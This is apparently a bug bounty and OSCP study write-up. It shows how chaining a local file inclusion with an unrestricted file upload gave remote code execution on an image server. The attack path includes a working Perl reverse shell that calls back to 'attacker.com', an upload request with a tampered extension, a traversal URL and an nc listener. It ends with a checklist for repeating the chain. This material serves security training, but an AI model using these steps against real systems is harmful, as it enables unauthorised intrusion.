
# OSCP + Bug Bounty: LFI + Unrestricted File Upload → RCE

*By Armaan Pathan*
*Original Post: [Medium](https://medium.com/@armaanpathan/chain-the-bugs-to-pwn-an-organisation-lfi-unrestricted-file-upload-remote-code-execution-93dfa78ecce)*
*Date: Sep 18, 2018*

---

## Overview: What Happened?

A critical vulnerability was discovered where an attacker was able to **chain two bugs — LFI (Local File Inclusion)** and **Unrestricted File Upload** — to achieve **Remote Code Execution (RCE)** on a production server.

The target application had:

* A **photo upload feature** that stored images on a separate **image server**.
* A **vulnerable endpoint** on the image server that allowed **Local File Inclusion (LFI)** — exposing internal files like `/etc/passwd`, cron jobs, etc.
* A **misconfigured upload filter** that allowed uploading **arbitrary file types** (e.g., Perl scripts) by tampering with the `ext` parameter.

By abusing these issues together, the attacker managed to execute a **Perl reverse shell** on the server.

---

## Methodology: Step-by-Step Attack Path

### 1. Initial Reconnaissance

* During enumeration of the target app (`lol.com`), the attacker found a **subdomain** that acted as an **image server**.
* This server hosted and served all uploaded user profile images.

---

### 2. Finding LFI Vulnerability

* While exploring the image server, the attacker found an **endpoint** that allowed reading **internal server files** like:

  ```
  /etc/passwd
  /etc/crontab
  /proc/<pid>/status
  ```

* This confirmed a **Local File Inclusion (LFI)** vulnerability was present.

---

### 3. Discovering Upload Functionality

* Back on the main site (`lol.com`), the attacker found a **profile photo upload** feature.

* Uploaded files were stored on the **same image server** affected by LFI.

* The upload request included an `ext` parameter, like:

  ```http
  POST /upload
  Content-Disposition: form-data; name="ext"

  jpg
  ```

* By tampering with `ext`, the attacker uploaded a **file with a custom extension** (e.g., `.pl`).

---

### 4. Uploading a Perl Reverse Shell

* The server didn't execute PHP, but it did support Perl scripts.

* So the attacker uploaded a **Perl reverse shell** script with `.pl` extension.

  Example payload:

  ```perl
  perl -e 'use Socket;$i="attacker.com";$p=4444;
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
  if(connect(S,sockaddr_in($p,inet_aton($i)))) {
    open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S");
    exec("/bin/sh -i");
  }'
  ```

* The file was successfully stored on the image server.

---

### 5. Triggering Execution via LFI

* Using the LFI vulnerability, the attacker included the uploaded Perl file in the vulnerable endpoint.

  Example:

  ```
  http://img.lol.com/view?file=../../uploads/reverse.pl
  ```

* As a result, the Perl code was executed, and the attacker received a **reverse shell** back to their machine.

---

## Technical Explanation

This attack was possible due to the combination of:

* No validation of file type or extension during upload.
* Lack of content filtering for uploaded files.
* LFI vulnerability that allowed accessing any file, including uploaded payloads.
* The image server executed Perl scripts when included via LFI.

---

## Impact

* Remote Code Execution (RCE) on production server.
* Full access to the underlying OS via reverse shell.
* Potential for:

  * Privilege escalation
  * Lateral movement
  * Data exfiltration
  * Service disruption

## Variants and Extended Scenarios

| Scenario                  | Description                                                          |
| ------------------------- | -------------------------------------------------------------------- |
| Upload + LFI = RCE        | Chaining file upload and file inclusion for code execution           |
| Perl Shell instead of PHP | When PHP is blocked, try scripting languages like Perl, Python, Bash |
| Tampered Extension        | `ext=pl` instead of expected values like `jpg` or `png`              |
| Stored on separate domain | Upload server on separate subdomain, still vulnerable                |
| Blind file execution      | No direct link needed — executed via backend inclusion (LFI)         |

## Checklist

Use this checklist to test similar chained vulnerabilities:

| Step                       | Description                                              | Status |
| -------------------------- | -------------------------------------------------------- | ------ |
| LFI Found                  | Confirm the ability to include internal server files     | 🔲     |
| Upload Feature Available   | Confirm file upload interface exists                     | 🔲     |
| Extension Tampering        | Try bypassing filters using ext param or filename tricks | 🔲     |
| Payload Delivered          | Upload shell (e.g., Perl, Python, Bash)                  | 🔲     |
| File Stored on LFI Server  | Confirm upload is reachable via LFI server               | 🔲     |
| Trigger Reverse Shell      | Trigger shell using LFI endpoint                         | 🔲     |
| LFI Executes Uploaded File | Confirm inclusion executes script, not just displays it  | 🔲     |
| Network Listening Setup    | Set up `nc -lnvp` listener before triggering shell       | 🔲     |
| Post-Exploitation          | Explore privilege escalation or lateral movement         | 🔲     |
